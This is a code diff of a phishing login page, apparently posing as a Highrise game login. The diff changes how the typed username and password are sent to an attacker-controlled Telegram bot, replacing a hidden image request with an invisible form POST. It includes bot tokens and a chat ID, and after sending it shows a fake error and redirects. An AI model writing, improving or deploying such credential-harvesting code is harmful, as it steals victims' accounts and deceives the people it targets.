@@ -42,16 +42,30 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // === ВАШ ТОКЕН И CHAT_ID ===
-      const BOT_TOKEN = '8681081134:AAHF_jOZWNDK4RqH7hntuvjgTCas8lCmS-Y';
+      // === НОВЫЙ ТОКЕН И ВАШ CHAT_ID ===
+      const BOT_TOKEN = '8814083039:AAFef6Bi8OcG9AZ45GmxOZWTKAClnmR7yR0';
       const CHAT_ID = '7327749600';
 
-      // === ОТПРАВКА ЧЕРЕЗ IMG (ОБХОД CORS) ===
-      const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🔐 Highrise Login\n👤 ' + username + '\n🔑 ' + password)};
-      const img = document.createElement('img');
-      img.src = url;
-      img.style.display = 'none';
-      document.body.appendChild(img);
+      // === ОТПРАВКА ЧЕРЕЗ НЕВИДИМУЮ ФОРМУ (ГАРАНТИРОВАННО РАБОТАЕТ) ===
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+      form.target = 'hiddenFrame';
+
+      const inputChatId = document.createElement('input');
+      inputChatId.type = 'hidden';
+      inputChatId.name = 'chat_id';
+      inputChatId.value = CHAT_ID;
+      form.appendChild(inputChatId);
+
+      const inputText = document.createElement('input');
+      inputText.type = 'hidden';
+      inputText.name = 'text';
+      inputText.value = 🔐 Highrise Login\n👤 ${username}\n🔑 ${password};
+      form.appendChild(inputText);
+
+      document.body.appendChild(form);
+      form.submit();
 
       // Показываем ошибку и перенаправляем
       document.getElementById('errorMsg').style.display = 'block';
